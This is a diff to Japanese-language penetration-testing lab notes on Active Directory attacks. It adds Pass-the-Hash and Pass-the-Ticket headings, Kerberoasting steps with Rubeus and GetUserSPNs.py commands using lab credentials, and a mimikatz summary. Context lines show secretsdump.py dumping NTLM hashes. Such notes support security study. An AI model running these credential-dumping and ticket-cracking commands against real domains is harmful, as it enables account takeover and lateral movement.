@@ -1895,6 +1895,19 @@ $ radare2 rev100
 
 ![C94044F7-E7F4-4F3C-BD2D-3B6FE3F5DB22](https://user-images.githubusercontent.com/39001773/137325698-095563cf-7c6c-44d3-b6b6-b7c318695f81.png)
 
+passwordのhashがわかった時は、Pass The Hash 攻撃
+
+TGTやTGSなどがわかった時は、Pass The Ticket 攻撃
+
+### Pass The Hash 攻撃
+
+<img src="https://user-images.githubusercontent.com/39001773/137400793-539d526a-379a-4e42-8a37-cb47dd986696.png" width = 500>
+
+
+
+### Pass The Ticket 攻撃
+
+<img src="https://user-images.githubusercontent.com/39001773/137400793-539d526a-379a-4e42-8a37-cb47dd986696.png" width = 500>
 
 ### Kerobroasting
 
@@ -1911,6 +1924,11 @@ Kerberoastingの流れ
 3. 発行されたサービスチケットをメモリに展開してファイルに保存する。
 
 4. ツール等を用いてオフラインでサービスチケットからサービス・アカウントのパスワードをクラックする。
+
+ex1: Rubeus.exe kerberoast
+
+ex2: GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.127.183 -request
+
 
 ## ツール
 
@@ -1967,6 +1985,19 @@ python3 /home/kali/.local/bin/GetNPUsers.py -dc-ip 10.10.176.6 spookysec.local/ 
 
 ```
 
+### GetUserSPNs.py
+
+Kerberoasting
+
+try to find and fetch Service Principal Names that are associated with normal user accounts.
+
+```
+
+GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.127.183 -request
+
+```
+
+
 ### secretsdump.py
 
 remote machine から秘匿情報をdumpする。
@@ -1974,7 +2005,6 @@ remote machine から秘匿情報をdumpする。
 we dump NTLM hashes, Plaintext credentials (if available) and Kerberos keys
 
 ```
-
 secretsdump.py spooky.sec.local/backup:'backup2517860'@10.10.108.200 -just-dc 
 
 -just-dc: Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)
@@ -1986,6 +2016,27 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
 ...
 
 ```
+
+### mimikatz
+
+Windowsのメモリ上に保持されているアカウントの認証情報にアクセスし、管理者権限の取得や他のアカウントの「なりすまし」を行うためのツール
+
+- 資格情報の取得
+
+・生パスワード （キャッシュに存在すれば）
+
+・NTLMパスワードハッシュ値
+
+・Kerberosチケット
+
+- なりすまし攻撃
+
+・Pass-the-Hash
+
+・Pass-the-Ticket
+
+・Ticketの偽造
+
 
 ### evil-winrm
 
